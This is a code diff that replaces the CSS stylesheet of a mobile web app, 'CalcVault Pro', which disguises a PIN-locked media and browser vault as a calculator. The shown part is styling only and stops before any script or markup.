@@ -1,842 +1,2402 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Calculator</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-:root {
---bg-dark: #0f0c29;
---bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
---glass: rgba(255, 255, 255, 0.05);
---glass-border: rgba(255, 255, 255, 0.1);
---primary: #8e2de2;
---accent: #4a00e0;
---neon-blue: #00f2ff;
---text-main: #ffffff;
---text-muted: #aaaaaa;
---danger: #ff4b5c;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CalcVault Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
 
-code
-Code
-download
-content_copy
-expand_less
-* {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        -webkit-tap-highlight-color: transparent;
-        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-        user-select: none;
-    }
+        :root {
+            --deep-black: #0a0a0f;
+            --charcoal: #1a1a24;
+            --neon-blue: #00d4ff;
+            --cyan: #00f7ff;
+            --purple: #8a2be2;
+            --purple-glow: rgba(138, 43, 226, 0.4);
+            --red: #ff4757;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text: #ffffff;
+            --text-secondary: #b0b0c0;
+        }
 
-    body {
-        background: var(--bg-gradient);
-        height: 100vh;
-        width: 100vw;
-        overflow: hidden;
-        color: var(--text-main);
-        display: flex;
-        flex-direction: column;
-    }
+        body {
+            background: linear-gradient(135deg, var(--deep-black) 0%, #151522 100%);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
 
-    /* --- UTILS --- */
-    .hidden { display: none !important; }
-    .fade-in { animation: fadeIn 0.4s ease forwards; }
-    .slide-up { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(138, 43, 226, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, rgba(0, 212, 255, 0.08) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
 
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .screen {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
 
-    /* --- SCREEN CONTAINERS --- */
-    .screen {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        display: flex;
-        flex-direction: column;
-        z-index: 10;
-    }
+        .screen.active {
+            display: flex;
+        }
 
-    /* --- SETUP SCREEN --- */
-    #setup-screen {
-        justify-content: center;
-        align-items: center;
-        background: var(--bg-dark);
-        z-index: 50;
-    }
-    .setup-content {
-        text-align: center;
-        width: 80%;
-    }
-    .setup-title {
-        font-size: 1.5rem;
-        margin-bottom: 2rem;
-        background: linear-gradient(to right, var(--neon-blue), var(--primary));
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-    }
-    .pin-display {
-        font-size: 2.5rem;
-        letter-spacing: 1rem;
-        margin-bottom: 2rem;
-        min-height: 3rem;
-        color: var(--neon-blue);
-    }
+        /* Status Bar */
+        .status-bar {
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 5px 15px;
+            font-size: 14px;
+            font-weight: 600;
+            background: rgba(10, 10, 15, 0.9);
+            border-radius: 0 0 20px 20px;
+            margin: -20px -20px 20px;
+            padding-top: 30px;
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
 
-    /* --- CALCULATOR UI --- */
-    #calc-screen {
-        background: var(--bg-dark);
-        z-index: 40;
-    }
-    .calc-display {
-        flex: 1;
-        display: flex;
-        justify-content: flex-end;
-        align-items: flex-end;
-        padding: 2rem;
-        font-size: 3.5rem;
-        word-break: break-all;
-        text-shadow: 0 0 10px rgba(255,255,255,0.1);
-    }
-    .calc-pad {
-        background: var(--glass);
-        backdrop-filter: blur(20px);
-        border-top-left-radius: 30px;
-        border-top-right-radius: 30px;
-        padding: 1.5rem;
-        display: grid;
-        grid-template-columns: repeat(4, 1fr);
-        gap: 15px;
-        box-shadow: 0 -10px 30px rgba(0,0,0,0.3);
-    }
-    .btn-calc {
-        height: 70px;
-        width: 70px;
-        border-radius: 50%;
-        border: none;
-        background: rgba(255,255,255,0.05);
-        color: #fff;
-        font-size: 1.5rem;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        margin: auto;
-        transition: transform 0.1s, background 0.2s;
-        box-shadow: 5px 5px 10px rgba(0,0,0,0.2), -5px -5px 10px rgba(255,255,255,0.02);
-    }
-    .btn-calc:active { transform: scale(0.9); }
-    .btn-op { color: var(--neon-blue); font-weight: bold; }
-    .btn-eq { background: linear-gradient(135deg, var(--primary), var(--accent)); box-shadow: 0 5px 15px rgba(142, 45, 226, 0.4); }
-    .btn-clr { color: var(--danger); }
+        .status-bar.active {
+            display: flex;
+        }
 
-    /* --- VAULT UI --- */
-    #vault-screen {
-        background: var(--bg-gradient);
-        z-index: 30;
-        display: none;
-    }
-    
-    /* Header */
-    .vault-header {
-        padding: 1.5rem;
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        background: rgba(0,0,0,0.2);
-        backdrop-filter: blur(10px);
-    }
-    .vault-title { font-size: 1.2rem; font-weight: 700; letter-spacing: 1px; }
-    .vault-lock { color: var(--neon-blue); filter: drop-shadow(0 0 5px var(--neon-blue)); }
+        .time {
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
 
-    /* Content Area */
-    .vault-content {
-        flex: 1;
-        overflow-y: auto;
-        padding: 1rem;
-        padding-bottom: 100px; /* Space for nav */
-    }
-    
-    /* Sections */
-    .section-view { display: none; height: 100%; width: 100%; }
-    .section-view.active { display: block; animation: fadeIn 0.3s ease; }
+        .battery {
+            color: var(--cyan);
+        }
 
-    /* Home Grid */
-    .app-grid {
-        display: grid;
-        grid-template-columns: repeat(2, 1fr);
-        gap: 15px;
-    }
-    .app-card {
-        background: var(--glass);
-        border: 1px solid var(--glass-border);
-        border-radius: 20px;
-        padding: 1.5rem;
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 10px;
-        transition: all 0.2s;
-    }
-    .app-card:active { transform: scale(0.95); background: rgba(255,255,255,0.1); }
-    .app-icon {
-        font-size: 2rem;
-        margin-bottom: 5px;
-        background: linear-gradient(to bottom right, #fff, #aaa);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-    }
-    .app-name { font-size: 0.9rem; color: var(--text-muted); }
-    
-    /* Colors for icons */
-    .ic-gal { filter: drop-shadow(0 0 10px rgba(255, 200, 0, 0.5)); }
-    .ic-vid { filter: drop-shadow(0 0 10px rgba(255, 0, 100, 0.5)); }
-    .ic-brw { filter: drop-shadow(0 0 10px rgba(0, 200, 255, 0.5)); }
-    .ic-yt { filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.5)); }
-    .ic-game { filter: drop-shadow(0 0 10px rgba(0, 255, 100, 0.5)); }
+        /* PIN Screen */
+        .pin-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 30px;
+        }
 
-    /* Gallery & Video Grid */
-    .media-grid {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 5px;
-    }
-    .media-item {
-        aspect-ratio: 1;
-        background: #000;
-        border-radius: 8px;
-        overflow: hidden;
-        position: relative;
-    }
-    .media-item img, .media-item video { width: 100%; height: 100%; object-fit: cover; }
-    .btn-float {
-        position: fixed;
-        bottom: 90px;
-        right: 20px;
-        background: var(--neon-blue);
-        width: 55px;
-        height: 55px;
-        border-radius: 50%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);
-        color: #000;
-        font-size: 1.5rem;
-        z-index: 100;
-    }
+        .pin-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
-    /* Browser & YT */
-    .web-container { width: 100%; height: 100%; display: flex; flex-direction: column; }
-    .url-bar {
-        display: flex;
-        gap: 10px;
-        margin-bottom: 10px;
-    }
-    .url-input {
-        flex: 1;
-        background: rgba(0,0,0,0.3);
-        border: 1px solid var(--glass-border);
-        border-radius: 20px;
-        padding: 8px 15px;
-        color: white;
-        outline: none;
-    }
-    .web-frame {
-        flex: 1;
-        border: none;
-        border-radius: 10px;
-        background: white;
-    }
-    
-    /* Games List */
-    .game-list { display: flex; flex-direction: column; gap: 15px; }
-    .game-card {
-        display: flex;
-        gap: 15px;
-        background: var(--glass);
-        padding: 10px;
-        border-radius: 15px;
-        align-items: center;
-    }
-    .game-thumb { width: 80px; height: 80px; border-radius: 10px; background: #333; object-fit: cover;}
-    .game-info h3 { font-size: 1rem; margin-bottom: 5px; }
-    .game-info p { font-size: 0.8rem; color: var(--text-muted); }
+        .pin-title {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(90deg, var(--purple), var(--neon-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
 
-    /* Fullscreen Viewers */
-    .viewer-overlay {
-        position: fixed;
-        top: 0; left: 0; width: 100%; height: 100%;
-        background: #000;
-        z-index: 200;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-    }
-    .viewer-content { flex: 1; display: flex; align-items: center; justify-content: center; }
-    .viewer-content img, .viewer-content video { max-width: 100%; max-height: 100%; }
-    .viewer-controls {
-        height: 60px;
-        display: flex;
-        justify-content: space-around;
-        align-items: center;
-        background: rgba(255,255,255,0.1);
-    }
+        .pin-subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            max-width: 300px;
+            line-height: 1.5;
+        }
 
-    /* Bottom Nav */
-    .bottom-nav {
-        position: absolute;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 90%;
-        height: 65px;
-        background: rgba(15, 12, 41, 0.85);
-        backdrop-filter: blur(15px);
-        border-radius: 35px;
-        display: flex;
-        justify-content: space-around;
-        align-items: center;
-        border: 1px solid rgba(255,255,255,0.08);
-        box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-    }
-    .nav-item {
-        color: #666;
-        font-size: 1.2rem;
-        padding: 10px;
-        border-radius: 50%;
-        transition: all 0.3s;
-        position: relative;
-    }
-    .nav-item.active {
-        color: var(--neon-blue);
-        background: rgba(0, 242, 255, 0.1);
-        transform: translateY(-5px);
-    }
-    .nav-item.active::after {
-        content: '';
-        position: absolute;
-        bottom: -5px;
-        left: 50%;
-        transform: translateX(-50%);
-        width: 5px;
-        height: 5px;
-        background: var(--neon-blue);
-        border-radius: 50%;
-        box-shadow: 0 0 10px var(--neon-blue);
-    }
+        .pin-display {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+        }
 
-</style>
+        .pin-dot {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--glass);
+            border: 2px solid var(--glass-border);
+            transition: all 0.2s ease;
+        }
+
+        .pin-dot.filled {
+            background: var(--neon-blue);
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 15px var(--neon-blue);
+        }
+
+        .pin-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            max-width: 300px;
+            margin-top: 20px;
+        }
+
+        .pin-btn {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: rgba(30, 30, 40, 0.8);
+            border: 1px solid var(--glass-border);
+            color: white;
+            font-size: 26px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pin-btn:active {
+            transform: scale(0.92);
+            background: rgba(50, 50, 70, 0.9);
+        }
+
+        .pin-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.3s ease;
+        }
+
+        .pin-btn:active::after {
+            transform: translate(-50%, -50%) scale(10);
+            opacity: 0;
+        }
+
+        .pin-btn.equals {
+            background: linear-gradient(135deg, var(--purple), #6a11cb);
+            border: none;
+            box-shadow: 0 5px 20px var(--purple-glow);
+            grid-column: 2;
+        }
+
+        .pin-btn.equals:active {
+            box-shadow: 0 2px 10px var(--purple-glow);
+        }
+
+        .pin-btn.backspace i {
+            font-size: 22px;
+            color: var(--text-secondary);
+        }
+
+        /* Calculator Screen */
+        .calculator {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+            padding-bottom: 20px;
+        }
+
+        .calc-display {
+            text-align: right;
+            padding: 30px 20px;
+            margin-bottom: 20px;
+            background: rgba(15, 15, 25, 0.7);
+            border-radius: 20px;
+            border: 1px solid var(--glass-border);
+            backdrop-filter: blur(10px);
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            overflow: hidden;
+        }
+
+        .calc-history {
+            font-size: 18px;
+            color: var(--text-secondary);
+            min-height: 27px;
+            margin-bottom: 10px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .calc-current {
+            font-size: 48px;
+            font-weight: 300;
+            line-height: 1;
+            word-break: break-all;
+            overflow-wrap: break-word;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+        }
+
+        .calc-buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+        }
+
+        .calc-btn {
+            aspect-ratio: 1;
+            border-radius: 50%;
+            border: none;
+            background: rgba(40, 40, 55, 0.9);
+            color: white;
+            font-size: 26px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.15s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .calc-btn:active {
+            transform: scale(0.92);
+        }
+
+        .calc-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.3s ease;
+        }
+
+        .calc-btn:active::after {
+            transform: translate(-50%, -50%) scale(12);
+            opacity: 0;
+        }
+
+        .calc-btn.operator {
+            background: linear-gradient(135deg, var(--neon-blue), #0099cc);
+            color: var(--deep-black);
+            font-weight: 600;
+        }
+
+        .calc-btn.equals {
+            background: linear-gradient(135deg, var(--purple), #6a11cb);
+            color: white;
+            font-size: 32px;
+            box-shadow: 0 5px 20px var(--purple-glow);
+        }
+
+        .calc-btn.clear {
+            background: linear-gradient(135deg, var(--red), #ff3838);
+            color: white;
+        }
+
+        .calc-btn.zero {
+            grid-column: span 2;
+            aspect-ratio: 2 / 1;
+            border-radius: 40px;
+        }
+
+        /* Vault Container */
+        .vault-container {
+            display: none;
+            flex: 1;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .vault-container.active {
+            display: flex;
+        }
+
+        /* Vault Header */
+        .vault-header {
+            padding: 25px 20px 20px;
+            text-align: center;
+            background: rgba(10, 10, 15, 0.95);
+            border-bottom: 1px solid var(--glass-border);
+            backdrop-filter: blur(10px);
+        }
+
+        .vault-title {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(90deg, var(--cyan), var(--neon-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .vault-title i {
+            font-size: 28px;
+            text-shadow: 0 0 15px var(--neon-blue);
+        }
+
+        .vault-subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            max-width: 300px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        .vault-settings {
+            position: absolute;
+            top: 30px;
+            right: 20px;
+            font-size: 22px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .vault-settings:hover {
+            color: var(--neon-blue);
+        }
+
+        /* Vault Content */
+        .vault-content {
+            flex: 1;
+            padding: 25px 20px 80px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 20px;
+            align-content: start;
+        }
+
+        .vault-card {
+            background: linear-gradient(145deg, rgba(30, 30, 45, 0.9), rgba(20, 20, 35, 0.9));
+            border-radius: 20px;
+            padding: 25px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .vault-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.03), transparent);
+            transform: translateX(-100%);
+        }
+
+        .vault-card:active {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 212, 255, 0.2);
+        }
+
+        .vault-card:active::before {
+            animation: shine 0.6s ease;
+        }
+
+        .vault-icon {
+            font-size: 36px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, var(--purple), var(--neon-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .vault-card-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: white;
+        }
+
+        .vault-card-desc {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        /* Section Screens */
+        .section-screen {
+            display: none;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            background: var(--deep-black);
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            animation: slideUp 0.3s ease;
+        }
+
+        .section-screen.active {
+            display: flex;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            padding: 25px 20px 20px;
+            background: rgba(10, 10, 15, 0.95);
+            border-bottom: 1px solid var(--glass-border);
+            backdrop-filter: blur(10px);
+        }
+
+        .section-back {
+            font-size: 22px;
+            color: var(--neon-blue);
+            cursor: pointer;
+            margin-right: 20px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.3s;
+        }
+
+        .section-back:active {
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            flex: 1;
+        }
+
+        .section-content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        /* Gallery */
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            gap: 15px;
+        }
+
+        .gallery-item {
+            aspect-ratio: 1;
+            border-radius: 15px;
+            overflow: hidden;
+            position: relative;
+            background: var(--charcoal);
+            border: 1px solid var(--glass-border);
+            cursor: pointer;
+        }
+
+        .gallery-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+
+        .gallery-item:active .gallery-img {
+            transform: scale(1.05);
+        }
+
+        .gallery-actions {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--charcoal), #252540);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+        }
+
+        .action-btn:active {
+            transform: scale(0.98);
+            background: linear-gradient(135deg, #252540, #303050);
+        }
+
+        /* Video */
+        .video-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .video-item {
+            background: var(--charcoal);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid var(--glass-border);
+        }
+
+        .video-thumb {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .video-info {
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .video-name {
+            font-weight: 600;
+            color: white;
+            max-width: 70%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .video-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .video-action-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .video-action-btn:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Browser */
+        .browser-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .url-input {
+            flex: 1;
+            padding: 15px 20px;
+            background: var(--charcoal);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .go-btn {
+            padding: 0 25px;
+            background: linear-gradient(135deg, var(--neon-blue), #0099cc);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .go-btn:active {
+            transform: scale(0.95);
+        }
+
+        .browser-frame {
+            width: 100%;
+            height: calc(100vh - 200px);
+            border: none;
+            border-radius: 15px;
+            background: white;
+            overflow: hidden;
+            border: 1px solid var(--glass-border);
+        }
+
+        /* YouTube */
+        .youtube-search {
+            margin-bottom: 20px;
+        }
+
+        .youtube-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 15px;
+        }
+
+        .youtube-item {
+            background: var(--charcoal);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid var(--glass-border);
+            cursor: pointer;
+        }
+
+        .youtube-thumb {
+            width: 100%;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+            display: block;
+        }
+
+        .youtube-title {
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+        }
+
+        /* Games */
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 20px;
+        }
+
+        .game-card {
+            background: linear-gradient(145deg, rgba(30, 30, 45, 0.9), rgba(20, 20, 35, 0.9));
+            border-radius: 20px;
+            padding: 20px;
+            cursor: pointer;
+            border: 1px solid var(--glass-border);
+            transition: transform 0.3s ease;
+        }
+
+        .game-card:active {
+            transform: scale(0.98);
+        }
+
+        .game-thumb {
+            width: 100%;
+            aspect-ratio: 1;
+            border-radius: 15px;
+            object-fit: cover;
+            margin-bottom: 15px;
+            border: 1px solid var(--glass-border);
+        }
+
+        .game-title {
+            font-weight: 700;
+            color: white;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+
+        .game-desc {
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        /* Fullscreen Viewer */
+        .fullscreen-viewer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .fullscreen-viewer.active {
+            display: flex;
+        }
+
+        .fullscreen-img {
+            max-width: 90%;
+            max-height: 70%;
+            border-radius: 10px;
+            object-fit: contain;
+        }
+
+        .fullscreen-video {
+            max-width: 90%;
+            max-height: 70%;
+            border-radius: 10px;
+        }
+
+        .viewer-actions {
+            display: flex;
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .viewer-btn {
+            padding: 15px 30px;
+            background: linear-gradient(135deg, var(--charcoal), #252540);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+        }
+
+        .viewer-btn:active {
+            transform: scale(0.95);
+        }
+
+        .close-viewer {
+            position: absolute;
+            top: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .close-viewer:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Settings Modal */
+        .settings-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1500;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .settings-modal.active {
+            display: flex;
+        }
+
+        .settings-content {
+            background: linear-gradient(145deg, var(--charcoal), #151522);
+            width: 90%;
+            max-width: 400px;
+            border-radius: 25px;
+            padding: 30px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .settings-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--neon-blue);
+        }
+
+        .settings-option {
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: background 0.3s;
+            border: 1px solid transparent;
+        }
+
+        .settings-option:active {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--glass-border);
+        }
+
+        .settings-icon {
+            font-size: 22px;
+            color: var(--neon-blue);
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 212, 255, 0.1);
+            border-radius: 10px;
+        }
+
+        .settings-text {
+            flex: 1;
+            font-weight: 600;
+            color: white;
+        }
+
+        .settings-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .settings-close:active {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        /* Bottom Navigation */
+        .bottom-nav {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(15, 15, 25, 0.95);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid var(--glass-border);
+            padding: 15px 10px;
+            z-index: 100;
+            box-shadow: 0 -5px 30px rgba(0, 0, 0, 0.3);
+            border-radius: 25px 25px 0 0;
+            transform: translateY(100%);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
+        }
+
+        .bottom-nav.active {
+            display: flex;
+            transform: translateY(0);
+        }
+
+        .nav-items {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 10px 15px;
+            border-radius: 15px;
+            transition: all 0.3s ease;
+            min-width: 60px;
+        }
+
+        .nav-item:active {
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(0.95);
+        }
+
+        .nav-item.active {
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+        }
+
+        .nav-icon {
+            font-size: 22px;
+        }
+
+        .nav-text {
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        @keyframes shine {
+            to { transform: translateX(100%); }
+        }
+
+        @keyframes vaultUnlock {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .vault-unlock {
+            animation: vaultUnlock 0.6s ease;
+        }
+
